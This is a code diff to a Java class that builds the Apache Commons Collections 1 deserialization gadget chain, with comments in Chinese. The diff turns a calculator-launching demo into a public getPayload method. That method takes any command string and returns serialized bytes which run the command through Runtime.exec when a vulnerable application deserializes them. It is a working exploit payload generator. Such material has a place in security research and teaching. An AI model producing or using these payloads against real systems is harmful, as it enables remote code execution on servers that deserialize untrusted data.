@@ -19,10 +19,7 @@ import java.util.Optional;
  * created by xjj on 2023/1/27
  */
 public class CommonCollections1 {
-
-    // 使用jdk8u66执行
-    public void gadget() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException {
-
+    public byte[] getPayload(String exp) throws ClassNotFoundException, NoSuchMethodException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException {
         Transformer[] transformers = new Transformer[]{
                 // runtime接口没有实现java.io.Serializable所以要继续使用反射, 因为Class类实现了Serializable
                 // 这样序列化的时候我们序列化的就不是Runtime类了
@@ -46,7 +43,7 @@ public class CommonCollections1 {
                 ),
                 // 执行Runtime类的exec方法, 传入的值的类型是String, 值如下"open -a Calculator"
                 new InvokerTransformer("exec",
-                        new Class[]{String.class}, new Object[]{"open -a Calculator"}
+                        new Class[]{String.class}, new Object[]{exp}
                 ),
                 new ConstantTransformer(1) // 隐藏告警日志
         };
@@ -77,6 +74,13 @@ public class CommonCollections1 {
 
         // 序列化并反序列化
         Optional<byte[]> b = SerializationUtil.serialize(obj);
+        return b.get();
+    }
+
+    // 使用jdk8u66执行
+    private void gadget() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException {
+        String exp = "open -a Calculator";
+        byte[] b = getPayload(exp);
         SerializationUtil.deserialize(b);
     }
 
